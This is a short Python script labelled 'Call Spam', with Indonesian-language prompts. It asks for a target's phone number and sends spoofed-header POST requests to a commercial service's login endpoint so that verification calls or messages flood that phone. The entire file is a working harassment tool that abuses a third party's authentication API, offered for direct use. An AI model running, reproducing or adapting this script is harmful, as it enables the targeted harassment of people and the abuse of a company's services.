# Coded By NumeX
# Credit Apikey : Sampari-Senpai

import os,sys,time,requests,json
from requests import post

def ulang():
    if sys.platform == "win32":
        os.system("cls")
    else:
        os.system("clear")

    tanya = input("[-] Mau Mengulang Program? [Y/N] : ")
    if tanya == "y" or tanya == "Y":
        awal()
    else:
        print("[x] Exiting Program..")
    sys.exit()


def awal():
    if sys.platform == "win32":
        os.system("cls")
    else:
        os.system("clear")
    print("""

            ░█████╗░░█████╗░██╗░░░░░██╗░░░░░  ░██████╗██████╗░░█████╗░███╗░░░███╗
            ██╔══██╗██╔══██╗██║░░░░░██║░░░░░  ██╔════╝██╔══██╗██╔══██╗████╗░████║
            ██║░░╚═╝███████║██║░░░░░██║░░░░░  ╚█████╗░██████╔╝███████║██╔████╔██║
            ██║░░██╗██╔══██║██║░░░░░██║░░░░░  ░╚═══██╗██╔═══╝░██╔══██║██║╚██╔╝██║
            ╚█████╔╝██║░░██║███████╗███████╗  ██████╔╝██║░░░░░██║░░██║██║░╚═╝░██║
            ░╚════╝░╚═╝░░╚═╝╚══════╝╚══════╝  ╚═════╝░╚═╝░░░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝

                    Call Spam By : https://github.com/NumeXx/Call-Spam
                                Credit To : Sampari-Senpai
    """)
    no = input("\n[-] Masukan No Target - Contoh (+62857×××××××××) : ")

    ua = {
    "Host": "api.myfave.com",
    "Connection": "keep-alive",
    "x-user-agent": "Fave-PWA/v1.0.0",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.83 Mobile Safari/537.36",
    "content-type": "application/json",
    "Accept": "*/*",
    "Origin": "https://m.myfave.com",
    "Referer": "https://m.myfave.com/jakarta/auth",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    }

    for i in range(1,5):
        dat = {"phone":no}
        r = requests.post("https://api.myfave.com/api/fave/v3/auth", data=json.dumps(dat), headers=ua).text
        if "6c047709f9da4291a568fa84b97b6d47" in r:
            print("[x] Spam Failed....")
            ulang()
        else:
            print("[-] Spam Success....")
        time.sleep(100)
        ulang()

awal()
